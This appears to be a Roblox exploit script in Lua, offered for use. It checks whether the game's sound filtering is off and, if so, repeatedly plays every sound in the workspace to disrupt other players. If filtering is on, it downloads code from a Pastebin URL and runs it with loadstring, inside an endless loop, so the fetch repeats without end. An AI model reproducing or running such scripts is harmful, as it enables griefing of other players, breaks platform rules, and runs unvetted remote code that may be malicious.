-- use the sound exploit first to check if sound is exploitable
while true do 
wait()
if game.SoundService.RespectFilteringEnabled == false then
for i,v in pairs(game.Workspace:GetDescendants()) do
if v:IsA("Sound") then 
v:Play()
end
end
else
loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
notify("Sound is unexploitable.", warn(":("))
end
end